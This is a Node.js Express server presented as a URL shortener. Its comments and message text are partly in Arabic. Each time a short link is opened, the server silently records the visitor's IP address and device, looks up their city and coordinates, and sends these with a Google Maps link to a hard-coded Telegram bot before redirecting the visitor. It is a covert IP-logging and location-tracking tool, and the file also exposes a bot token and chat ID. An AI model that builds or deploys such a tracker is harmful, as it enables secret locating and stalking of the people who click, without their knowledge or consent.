const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getIPLocation(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=country,city,lat,lon,isp`, { timeout: 2000 });
    if (res.data && res.data.status === 'success' && res.data.lat && res.data.lon) {
      return {
        country: res.data.country,
        city: res.data.city,
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp,
        source: 'IP-Based'
      };
    }
  } catch (e) { console.log('IP Geo fail'); }
  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    // إذا في GPS، استخدمه. إلا استخدم IP
    let location = null;
    let locationType = 'Unknown';

    if (gps && gps.lat && gps.lng) {
      location = {
        latitude: gps.lat,
        longitude: gps.lng,
        accuracy: gps.accuracy
      };
      locationType = `GPS (${gps.accuracy.toFixed(0)}m)`;
    } else {
      location = await getIPLocation(ip);
      locationType = location ? 'IP-Based' : 'Failed';
    }

    let msg = `
🔗 رابط جديد!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
`;

    if (location && location.latitude && location.longitude) {
      msg += `
📍 Country: ${location.country || 'N/A'}
🏙️ City: ${location.city || 'N/A'}
📊 Latitude: ${location.latitude}
📊 Longitude: ${location.longitude}
🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
📡 Type: ${locationType}
`;
    } else {
      msg += `⚠️ Location: Not determined\n`;
    }

    msg += `
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
  } catch (err) {
    console.error('Telegram Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url, gps } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0, gps };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const gps = linkStorage[code].gps;
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent, gps);
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));